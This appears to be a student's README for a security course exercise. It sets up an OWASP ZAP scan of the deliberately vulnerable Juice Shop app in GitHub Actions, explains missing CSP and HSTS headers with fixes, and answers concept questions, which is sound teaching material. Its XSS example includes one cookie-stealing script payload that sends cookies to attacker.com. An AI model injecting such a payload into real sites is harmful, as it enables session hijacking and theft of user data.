# OWASP ZAP: Detecting Web Vulnerabilities with GitHub Actions

This repository contains the solution for the Day 2 exercise, "OWASP Top 10 – Overview & Use Cases". The goal of this exercise was to set up a Dynamic Application Security Testing (DAST) pipeline, scan a vulnerable web application, analyze the results, and document the findings.

This was accomplished by:
1.  Setting up and running **OWASP Juice Shop** using Docker.
2.  Creating a **GitHub Actions** CI/CD pipeline to automate the security scan.
3.  Integrating the **OWASP ZAP Baseline Scan** to run against the application.
4.  Generating a vulnerability report and analyzing two key findings from the OWASP Top 10.

---

## Setup: Running the Target Application (OWASP Juice Shop)

For this exercise, OWASP Juice Shop was used as the vulnerable target application. It was run locally as a Docker container, providing a consistent and isolated testing environment.

The following steps were used to set up the application:

1.  **Pull the Docker Image:** The latest official image was pulled from Docker Hub.
    ```bash
    docker pull bkimminich/juice-shop
    ```

2.  **Run the Docker Container:** The container was started, mapping port 3000 on the local machine to port 3000 inside the container.
    ```bash
    docker run --rm -p 3000:3000 bkimminich/juice-shop
    ```
3.  The application was then accessible for testing at `http://localhost:3000`.

---

## CI/CD Pipeline Integration

A GitHub Actions workflow was configured in `.github/workflows/zap-scan.yml`.

---

#### Vulnerability 1: Content Security Policy (CSP) Header Not Set

*   **Impact:** This is a **Medium** severity finding. Without a Content Security Policy, the application is significantly more vulnerable to Cross-Site Scripting (XSS) attacks. A CSP acts as a critical layer of defense by telling the browser which sources of content (like scripts and styles) are trusted. If an attacker injects a malicious script from an untrusted domain, a proper CSP would block it from executing, which helps protect the user's session and sensitive data from being stolen.

*   **Recommended Fix:** Implement a Content Security Policy by adding the `Content-Security-Policy` HTTP header to all responses from the server. A good starting policy is to only allow content from the application's own domain. For example: `Content-Security-Policy: default-src 'self';`.

#### Vulnerability 2: Strict-Transport-Security (HSTS) Header Not Set

*   **Impact:** This is a **Low** severity finding but has a high potential impact. The lack of an HSTS header exposes users to man-in-the-middle attacks. If a user connects to the site via an insecure link (HTTP), an attacker could intercept the connection before it is redirected to secure HTTPS. This could allow the attacker to steal sensitive information like session cookies or login credentials during that initial insecure request.

*   **Recommended Fix:** Add the `Strict-Transport-Security` header to all HTTPS responses. A recommended configuration is `Strict-Transport-Security: max-age=31536000; includeSubDomains`. This forces the browser to only communicate with the site over HTTPS for the next year, closing the window for downgrade attacks.

---

## Core Concept Questions

### What is the purpose of DAST and how does it complement other security testing methods?

Dynamic Application Security Testing (DAST) is a "black-box" security testing method that finds vulnerabilities in a running application by simulating external attacks. It complements other methods like SAST (Static Application Security Testing) by finding runtime and environment-specific issues (e.g., server misconfigurations, authentication flaws, or vulnerabilities that only appear when different services interact) that cannot be found by analyzing source code alone.

**Use Case Example:** A developer writes perfectly secure code for handling file uploads, which passes all SAST scans. However, the operations team deploys the application to a cloud server where the storage bucket is accidentally configured to be publicly readable. A DAST scan, which actively probes the live application, would discover this misconfiguration by successfully accessing an uploaded file without authentication—a critical vulnerability that SAST was completely blind to.

### Explain how XSS or SQL injection vulnerabilities can affect an application and its users.

*   **XSS (Cross-Site Scripting):** Affects users by allowing attackers to execute malicious scripts in their browsers, which can lead to session hijacking, credential theft, and keylogging. It affects the application by damaging its reputation, defacing its content, and potentially leading to the compromise of administrator accounts, giving attackers control over the entire site.
*   **SQL Injection:** Affects the application by allowing attackers to bypass authentication, read, modify, or delete all data in the database. This can lead to a complete server compromise. It affects users by causing a massive data breach of their personal and financial information (passwords, credit cards, etc.), resulting in a total loss of trust.

**Use Case Example (XSS):** An attacker posts a comment on an e-commerce product review page. The comment contains a hidden script: `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`. The website fails to sanitize this input and displays the comment. Now, every legitimate user who views that product page will have their browser execute the script, unknowingly sending their session cookie to the attacker's server. The attacker can then use this cookie to take over the user's shopping session, steal their personal information, and make purchases with their saved credit card.

### Describe the steps you would take to fix the vulnerabilities detected in your ZAP scan.

1.  **Analyze and Prioritize:** Review the ZAP report to understand the vulnerabilities and prioritize them based on their risk level and potential impact. In this scan, the Medium-risk "Content Security Policy (CSP) Header Not Set" would be the top priority.
2.  **Remediate:** Implement code-level or configuration changes to fix the identified flaws. For the two vulnerabilities found, this involves adding the `Content-Security-Policy` and `Strict-Transport-Security` headers to the web server's or application's configuration.
3.  **Re-scan:** After deploying the fixes, run the ZAP scan again in the CI/CD pipeline. This is a critical step to verify that the fixes have successfully removed the vulnerabilities and have not introduced new ones.
4.  **Document:** Document the findings and the remediation steps taken for auditing, team knowledge sharing, and future reference.

**Use Case Example (Fixing HSTS):**
1.  **Analyze:** The ZAP report shows a "Strict-Transport-Security Header Not Set" warning.
2.  **Remediate:** A developer edits the web server's configuration (e.g., Nginx) and adds the line: `add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;`.
3.  **Re-scan:** The developer commits and pushes the configuration change. The GitHub Actions pipeline automatically runs the ZAP scan again. The new report shows that the HSTS warning is no longer present.
4.  **Document:** The developer closes the security ticket, linking to the successful pipeline run and the commit that fixed the issue.

### How does integrating ZAP scans into CI/CD pipelines support shift-left security practices?

Integrating ZAP scans into a CI/CD pipeline is a core practice of "shifting left" on security. It automates security testing early and often in the development lifecycle, rather than waiting until the end. This provides developers with immediate feedback on the security impact of their code changes. By catching vulnerabilities with every commit, organizations can fix issues when they are fastest, cheapest, and easiest to resolve, which dramatically reduces risk, lowers development costs, and builds a stronger, more security-conscious engineering culture.

**Use Case Example:**
*   **Without Shift-Left:** A team spends three months building a new feature. Right before launch, a manual penetration test finds a critical vulnerability. The launch is delayed for two weeks while developers scramble to fix old code they are no longer familiar with, causing stress and blowing the project budget.
*   **With Shift-Left:** A developer makes a small change and pushes it. Ten minutes later, the automated ZAP scan in their CI/CD pipeline fails, alerting them that their change accidentally introduced a potential XSS vulnerability. They immediately fix the issue in five minutes while the code is still fresh in their mind, push again, and the pipeline passes. The vulnerability is eliminated instantly at almost no cost.